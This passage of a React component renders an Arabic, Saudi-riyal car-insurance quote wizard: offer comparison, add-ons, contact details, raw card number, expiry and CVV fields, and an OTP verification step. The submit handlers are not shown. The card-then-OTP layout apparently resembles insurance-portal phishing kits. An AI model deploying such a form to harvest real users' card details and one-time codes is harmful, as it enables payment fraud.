                      className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
                        step.number === currentPage
                          ? "bg-[#109cd4] text-white shadow-lg scale-110"
                          : step.number < currentPage
                            ? "bg-green-500 text-white"
                            : "bg-gray-200 text-gray-600"
                      }`}
                    >
                      {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
                    </div>
                    <p
                      className={`text-xs mt-2 text-center w-20 ${
                        step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
                      }`}
                    >
                      {step.title.split(" ")[0]}
                    </p>
                  </div>
                  {index < steps.length - 1 && (
                    <div
                      className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
                      }`}
                    />
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Desktop Progress */}
          <div className="hidden sm:flex items-center justify-between">
            {steps.map((step, index) => (
              <div key={step.number} className="flex items-center">
                <div className="flex flex-col items-center">
                  <div
                    className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${
                      step.number === currentPage
                        ? "bg-[#109cd4] text-white shadow-lg scale-110"
                        : step.number < currentPage
                          ? "bg-green-500 text-white"
                          : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    {step.number < currentPage ? (
                      <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
                    ) : (
                      <step.icon className="w-6 h-6 lg:w-7 lg:h-7" />
                    )}
                  </div>
                  <div className="text-center mt-3">
                    <p
                      className={`text-sm lg:text-base font-semibold ${
                        step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
                      }`}
                    >
                      {step.title}
                    </p>
                    <p className="text-xs text-gray-500 hidden lg:block mt-1">{step.subtitle}</p>
                  </div>
                </div>
                {index < steps.length - 1 && (
                  <div
                    className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
                      step.number < currentPage ? "bg-green-500" : "bg-gray-300"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Form Content */}
        <div className="p-6 lg:p-8">
          <div className="min-h-[500px] lg:min-h-[600px]">
            {currentPage === 1 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    البيانات الأساسية
                  </h3>
                  <p className="text-gray-600">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
                </div>
                <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
                <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
              </div>
            )}

            {currentPage === 2 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    بيانات التأمين
                  </h3>
                  <p className="text-gray-600">حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة</p>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                  <ValidatedInput
                    label="تاريخ بداية الوثيقة"
                    fieldName="policyStartDate"
                    type="date"
                    required
                    min={new Date().toISOString().split("T")[0]}
                    autoFocus={true}
                  />
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-3">
                      القيمة التقديرية للمركبة <span className="text-red-500">*</span>
                    </label>
                    <Input
                      maxLength={6}
                      name="vehicleValue"
                      placeholder="54,715"
                      required
                      className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-4">
                    نوع التأمين <span className="text-red-500">*</span>
                  </label>
                  <div className="grid grid-cols-2 gap-4">
                    <button
                      type="button"
                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
                        formData.insuranceTypeSelected === "comprehensive"
                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                    >
                      <div className="text-center">
                        <Shield className="w-8 h-8 mx-auto mb-2 text-current" />
                        <div className="font-semibold">تأمين شامل</div>
                        <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
                      </div>
                    </button>
                    <button
                      type="button"
                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
                        formData.insuranceTypeSelected === "against-others"
                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                    >
                      <div className="text-center">
                        <Users className="w-8 h-8 mx-auto mb-2 text-current" />
                        <div className="font-semibold">تأمين ضد الغير</div>
                        <div className="text-sm text-gray-500 mt-1">التغطية الأساسية</div>
                      </div>
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                  <Card className="border-2 border-gray-200 hover:border-blue-300 transition-colors">
                    <CardContent className="p-6 text-center">
                      <div className="flex items-center justify-center gap-2 mb-4">
                        <Users className="w-6 h-6 text-[#109cd4]" />
                        <span className="font-semibold text-lg">إضافة سائقين</span>
                      </div>
                      <div className="flex items-center justify-center gap-4">
                        <button
                          type="button"
                          className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
                          onClick={() =>
                            handleFieldChange("additionalDrivers", Math.max(0, formData.additionalDrivers - 1))
                          }
                        >
                          -
                        </button>
                        <span className="text-2xl font-bold text-gray-900">{formData.additionalDrivers}</span>
                        <button
                          type="button"
                          className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
                          onClick={() =>
                            handleFieldChange("additionalDrivers", Math.min(5, formData.additionalDrivers + 1))
                          }
                        >
                          +
                        </button>
                      </div>
                      <p className="text-sm text-gray-500 mt-2">الحد الأقصى 5 سائقين</p>
                    </CardContent>
                  </Card>

                  <Card className="border-2 border-green-200 bg-green-50">
                    <CardContent className="p-6 text-center">
                      <div className="flex items-center justify-center gap-2 mb-4">
                        <Star className="w-6 h-6 text-green-600" />
                        <span className="font-semibold text-lg text-green-800">خصومات خاصة</span>
                      </div>
                      <div className="flex items-center gap-3 mb-3">
                        <input
                          type="checkbox"
                          className="w-5 h-5 text-green-600"
                          checked={formData.specialDiscounts}
                          onChange={(e) => handleFieldChange("specialDiscounts", e.target.checked)}
                        />
                        <span className="text-sm text-green-800">أريد الحصول على خصومات خاصة</span>
                      </div>
                      <Button className="bg-green-600 hover:bg-green-700 text-white w-full">عرض الخصومات</Button>
                    </CardContent>
                  </Card>
                </div>
              </div>
            )}

            {currentPage === 3 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    قائمة الأسعار
                  </h3>
                  <p className="text-gray-600">قارن بين العروض المتاحة واختر الأنسب لك</p>
                </div>

                <div className="flex justify-center mb-8">
                  <div className="flex bg-gray-100 rounded-xl p-1">
                    <button
                      type="button"
                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
                        formData.insuranceTypeSelected === "against-others"
                          ? "bg-[#109cd4] text-white shadow-md"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                    >
                      ضد الغير
                    </button>
                    <button
                      type="button"
                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
                        formData.insuranceTypeSelected === "comprehensive"
                          ? "bg-[#109cd4] text-white shadow-md"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                    >
                      شامل
                    </button>
                  </div>
                </div>

                <div className="space-y-4 max-h-96 overflow-y-auto">
                  {offerData
                    .filter((offer) => {
                      if (formData.insuranceTypeSelected === "comprehensive") {
                        return offer.type === "comprehensive" || offer.type === "special"
                      }
                      return offer.type === "against-others"
                    })
                    .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
                    .slice(0, 8)
                    .map((offer, index) => {
                      const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
                      const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
                      const isSelected = formData.selectedInsuranceOffer === offer.id

                      return (
                        <Card
                          key={offer.id}
                          className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${
                            isSelected
                              ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
                              : "hover:shadow-sm border-gray-200"
                          }`}
                          onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
                        >
                          <CardContent className="p-0">
                            {/* Header Section */}
                            <div className="p-4 pb-3">
                              <div className="flex items-start gap-3">
                                {/* Radio Button */}
                                <div className="flex-shrink-0 mt-1">
                                  <div
                                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
                                      isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
                                    }`}
                                  >
                                    {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
                                  </div>
                                </div>

                                {/* Icon */}
                                <div
                                  className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${
                                    isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
                                  }`}
                                >
                                  <Shield className={`w-6 h-6 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
                                </div>

                                {/* Content */}
                                <div className="flex-1 min-w-0">
                                  <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
                                    {offer.name.replace(/insurance/g, "").trim()}
                                  </h4>

                                  <div className="flex flex-wrap items-center gap-2">
                                    <Badge
                                      variant="secondary"
                                      className="text-xs font-medium bg-gray-100 text-gray-700 hover:bg-gray-100"
                                    >
                                      {getTypeBadge(offer.type)}
                                    </Badge>

                                    {index < 3 && (
                                      <Badge
                                        className={`text-xs font-medium ${
                                          index === 0
                                            ? "bg-green-100 text-green-700 hover:bg-green-100"
                                            : index === 1
                                              ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
                                              : "bg-orange-100 text-orange-700 hover:bg-orange-100"
                                        }`}
                                      >
                                        {getBadgeText(index)}
                                      </Badge>
                                    )}
                                  </div>
                                </div>

                                {/* Price */}
                                <div className="text-right flex-shrink-0">
                                  <p className="text-lg font-bold text-gray-900">{finalPrice.toFixed(0)}</p>
                                  <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
                                </div>
                              </div>
                            </div>

                            {/* Features Section */}
                            {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
                              <div className="px-4 pb-4">
                                <div className="pt-3 border-t border-gray-100">
                                  <div className="space-y-2">
                                    {offer.extra_features
                                      .filter((f) => f.price === 0)
                                      .slice(0, 3)
                                      .map((feature, idx) => (
                                        <div key={idx} className="flex items-center gap-2">
                                          <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <Check className="w-2.5 h-2.5 text-green-600" />
                                          </div>
                                          <span className="text-xs text-gray-700 leading-relaxed">
                                            {feature.content.length > 35
                                              ? feature.content.substring(0, 35) + "..."
                                              : feature.content}
                                          </span>
                                        </div>
                                      ))}
                                  </div>

                                  {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
                                    <p className="text-xs text-[#109cd4] mt-2 font-medium">
                                      +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
                                    </p>
                                  )}
                                </div>
                              </div>
                            )}

                            {/* Selected Indicator */}
                            {isSelected && (
                              <div className="absolute top-3 left-3">
                                <div className="w-6 h-6 bg-[#109cd4] rounded-full flex items-center justify-center">
                                  <Check className="w-3.5 h-3.5 text-white" />
                                </div>
                              </div>
                            )}
                          </CardContent>
                        </Card>
                      )
                    })}
                </div>

                {errors.selectedInsuranceOffer && (
                  <div className="flex items-center gap-2 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    <span>{errors.selectedInsuranceOffer}</span>
                  </div>
                )}
              </div>
            )}

            {currentPage === 4 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    الإضافات والخدمات
                  </h3>
                  <p className="text-gray-600">اختر الخدمات الإضافية التي تناسب احتياجاتك</p>
                </div>

                {(() => {
                  const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                  const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []

                  if (paidFeatures.length === 0) {
                    return (
                      <div className="text-center py-12">
                        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                          <CheckCircle className="w-10 h-10 text-green-600" />
                        </div>
                        <h4 className="text-2xl font-bold text-gray-900 mb-3">جميع المزايا مشمولة!</h4>
                        <p className="text-gray-600 text-lg">
                          العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية
                        </p>
                      </div>
                    )
                  }

                  return (
                    <div className="space-y-4">
                      {paidFeatures.map((feature) => (
                        <Card key={feature.id} className="border-2 border-gray-200 hover:shadow-md transition-all">
                          <CardContent className="p-6">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-4">
                                <input
                                  type="checkbox"
                                  className="w-5 h-5 text-[#109cd4]"
                                  checked={formData.selectedAddons.includes(feature.id)}
                                  onChange={(e) => {
                                    const newAddons = e.target.checked
                                      ? [...formData.selectedAddons, feature.id]
                                      : formData.selectedAddons.filter((id) => id !== feature.id)
                                    handleFieldChange("selectedAddons", newAddons)
                                  }}
                                />
                                <div>
                                  <h4 className="font-bold text-gray-900 text-lg">{feature.content}</h4>
                                  <p className="text-gray-600">خدمة إضافية اختيارية</p>
                                </div>
                              </div>
                              <div className="text-left">
                                <p className="text-xl font-bold text-gray-900">+{feature.price} ر.س</p>
                                <p className="text-sm text-gray-500">سنوياً</p>
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ))}
                    </div>
                  )
                })()}
              </div>
            )}

            {currentPage === 5 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    ملخص الطلب ومعلومات التواصل
                  </h3>
                  <p className="text-gray-600">راجع طلبك وأدخل معلومات التواصل لإتمام العملية</p>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                  <div className="space-y-6">
                    <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
                    <label>
                      رقم الهاتف
                    </label>
                    <Input
                      name="phone"
                      type="tel"
                      placeholder="05xxxxxxxx"
                      required
                      maxLength={10}
                      autoFocus={true}
                    />

                    <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                      <div className="flex items-start gap-3">
                        <input
                          type="checkbox"
                          className="w-5 h-5 mt-1 text-[#109cd4]"
                          checked={formData.agreeToTerms}
                          onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
                        />
                        <span className="text-sm text-blue-800">
                          أوافق على{" "}
                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
                            الشروط والأحكام
                          </a>{" "}
                          و{" "}
                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
                            سياسة الخصوصية
                          </a>
                        </span>
                      </div>
                    </div>
                    {errors.agreeToTerms && (
                      <div className="flex items-center gap-2 text-red-600 text-sm">
                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
                        <span>{errors.agreeToTerms}</span>
                      </div>
                    )}
                  </div>

                  <Card className="border-2 border-gray-200 h-fit">
                    <CardContent className="p-6">
                      {(() => {
                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                        if (!selectedOffer) {
                          return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
                        }

                        const basePrice = Number.parseFloat(selectedOffer.main_price)
                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
                          formData.selectedAddons.includes(f.id),
                        )
                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
                        const total = basePrice + addonsTotal + expenses

                        return (
                          <div className="space-y-4">
                            <div className="text-center mb-6">
                              <h4 className="text-xl font-bold text-gray-900">
                                {selectedOffer.name.replace(/insurance/g, "").trim()}
                              </h4>
                              <p className="text-gray-600">
                                {selectedOffer.type === "against-others"
                                  ? "تأمين ضد الغير"
                                  : selectedOffer.type === "comprehensive"
                                    ? "تأمين شامل"
                                    : "تأمين خاص"}
                              </p>
                            </div>

                            <div className="space-y-3">
                              <div className="flex justify-between items-center">
                                <span className="text-gray-600">قسط التأمين الأساسي</span>
                                <span className="font-semibold">{basePrice} ر.س</span>
                              </div>

                              {addonsTotal > 0 && (
                                <div className="flex justify-between items-center">
                                  <span className="text-gray-600">الإضافات المختارة</span>
                                  <span className="font-semibold">{addonsTotal} ر.س</span>
                                </div>
                              )}

                              {selectedOffer.extra_expenses.map((expense) => (
                                <div key={expense.id} className="flex justify-between items-center text-sm">
                                  <span className="text-gray-600">{expense.reason}</span>
                                  <span className="font-medium">
                                    {expense.reason.includes("خصم") ? "-" : "+"}
                                    {expense.price} ر.س
                                  </span>
                                </div>
                              ))}

                              <hr className="border-gray-200" />
                              <div className="flex justify-between items-center text-xl">
                                <span className="font-bold text-gray-900">المجموع الكلي</span>
                                <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
                              </div>
                            </div>
                          </div>
                        )
                      })()}
                    </CardContent>
                  </Card>
                </div>
              </div>
            )}

            {currentPage === 6 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    بيانات الدفع
                  </h3>
                  <p className="text-gray-600">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
                </div>

                <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
                  <div className="flex items-center gap-3">
                    <Lock className="w-6 h-6 text-[#109cd4] flex-shrink-0" />
                    <div>
                      <p className="font-semibold text-blue-900">دفع آمن ومحمي</p>
                      <p className="text-sm text-[#109cd4]">جميع بياناتك محمية بتشفير SSL 256-bit</p>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                  <div className="space-y-6">
                    <div>
                      <label className="block text-sm font-semibold text-gray-700 mb-3">
                        رقم البطاقة <span className="text-red-500">*</span>
                      </label>
                      <Input
                        name="cardNumber"
                        id="cardNumber"
                        type="tel"
                        placeholder="#### #### #### ####"
                        required
                        dir="ltr"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        maxLength={16}
                        autoFocus={true}
                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-semibold text-gray-700 mb-3">
                        الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
                      </label>
                      <Input
                        name="cardName"
                        id="cardName"
                        type="text"
                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                        value={cardName}
                        onChange={(e) => setCardName(e.target.value)}
                        placeholder="الاسم الكامل"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-3 gap-4">
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-3">
                          الشهر <span className="text-red-500">*</span>
                        </label>
                        <select
                          name="expiryMonth"
                          id="expiryMonth"
                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                          value={cardMonth}
                          onChange={(e) => setCardMonth(e.target.value)}
                        >
                          <option value="">الشهر</option>
                          {Array.from({ length: 12 }, (_, i) => (
                            <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                              {String(i + 1).padStart(2, "0")}
                            </option>
                          ))}
                        </select>
                      </div>

                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-3">
                          السنة <span className="text-red-500">*</span>
                        </label>
                        <select
                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                          value={cardYear}
                          onChange={(e) => setCardYear(e.target.value)}
                          name="expiryYear"
                          id="expiryYear"
                        >
                          <option value="">السنة</option>
                          {Array.from({ length: 10 }, (_, i) => {
                            const year = new Date().getFullYear() + i
                            return (
                              <option key={year} value={year}>
                                {year}
                              </option>
                            )
                          })}
                        </select>
                      </div>

                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-3">
                          CVV <span className="text-red-500">*</span>
                        </label>
                        <Input
                          name="cvv"
                          id="cvv"
                          type="password"
                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                          placeholder="123"
                          maxLength={3}
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value)}
                        />
                      </div>
                    </div>
                  </div>

                  <Card className="border-2 border-gray-200 h-fit">
                    <CardContent className="p-6">
                      <h4 className="text-xl font-bold text-gray-900 mb-6">ملخص الدفع</h4>
                      {(() => {
                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                        if (!selectedOffer) return null

                        const basePrice = Number.parseFloat(selectedOffer.main_price)
                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
                          formData.selectedAddons.includes(f.id),
                        )
                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
                        const total = basePrice + addonsTotal + expenses

                        return (
                          <div className="space-y-3">
                            <div className="flex justify-between text-sm">
                              <span>قسط التأمين</span>
                              <span>{basePrice} ر.س</span>
                            </div>
                            {addonsTotal > 0 && (
                              <div className="flex justify-between text-sm">
                                <span>الإضافات</span>
                                <span>{addonsTotal} ر.س</span>
                              </div>
                            )}
                            <div className="flex justify-between text-sm">
                              <span>الرسوم والضرائب</span>
                              <span>{expenses} ر.س</span>
                            </div>
                            <hr />
                            <div className="flex justify-between font-bold text-lg">
                              <span>المجموع</span>
                              <span className="text-green-600">{total} ر.س</span>
                            </div>
                          </div>
                        )
                      })()}
                    </CardContent>
                  </Card>
                </div>
              </div>
            )}

            {currentPage === 7 && (
              <div className="space-y-8">
                <div className="text-center mb-8">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                    التحقق من الهوية
                  </h3>
                  <p className="text-gray-600">أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية</p>
                </div>

                <div className="max-w-md mx-auto text-center space-y-8">
                  <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                    <Phone className="w-10 h-10 text-[#109cd4]" />
                  </div>

                  <div>
                    <h4 className="text-xl font-bold text-gray-900 mb-3">تم إرسال رمز التحقق</h4>
                    <p className="text-gray-600">
                      تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
                      <br />
                      <span className="font-semibold">{formData.phone}</span>
                    </p>
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-3">
                      رمز التحقق <span className="text-red-500">*</span>
                    </label>
                    <Input
                      name="otp"
                      type="text"
                      placeholder="######"
                      required
                      value={otp}
                      maxLength={6}
                      onChange={(e) => setOtp(e.target.value)}
                      autoFocus={true}
                      className="text-center text-2xl h-14 tracking-widest border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                    />
                  </div>

                  {otpTimer > 0 ? (
                    <p className="text-sm text-gray-500">
                      يمكنك طلب رمز جديد خلال {Math.floor(otpTimer / 60)}:{(otpTimer % 60).toString().padStart(2, "0")}
                    </p>
                  ) : (
                    <Button
                      variant="outline"
                      onClick={sendOTP}
                      className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50"
                    >
                      إرسال رمز جديد
                    </Button>
                  )}

                  {otpAttempts > 0 && (
                    <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* Enhanced Navigation Buttons */}
          <div className="flex flex-col sm:flex-row justify-between items-center mt-8 pt-8 border-t border-gray-200 gap-4 sm:gap-0">
            <Button
              variant="outline"
              onClick={prevStep}
              disabled={currentPage === 1 || paymentProcessing || isSubmitting}
              className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
            >
              <ArrowLeft className="w-4 h-4 ml-2" />
              السابق
            </Button>

            <div className="text-sm text-gray-500 order-1 sm:order-2 bg-gray-100 px-4 py-2 rounded-full">
              الخطوة {currentPage} من {steps.length}
            </div>

            {currentPage < 6 ? (
              <Button
                onClick={nextStep}
                className="bg-[#109cd4] hover:bg-blue-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
                disabled={isSubmitting}
              >
                التالي
                <ArrowLeft className="w-4 h-4 mr-2 rotate-180" />
              </Button>
            ) : currentPage === 6 ? (
              <Button
                onClick={handlePayment}
                disabled={paymentProcessing}
                className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
              >
                {paymentProcessing ? (
                  <div className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    جاري معالجة الدفع...
                  </div>
                ) : (
                  <>
                    <CreditCard className="w-4 h-4 ml-2" />
                    تأكيد الدفع
                  </>
                )}
              </Button>
            ) : (
              <Button
                onClick={verifyOTP}
                disabled={isSubmitting}
                className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
              >
                {isSubmitting ? (
                  <div className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    جاري التحقق...
                  </div>
                ) : (
                  <>
                    <CheckCircle className="w-4 h-4 ml-2" />
                    تأكيد الرمز
                  </>
                )}
              </Button>
            )}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}
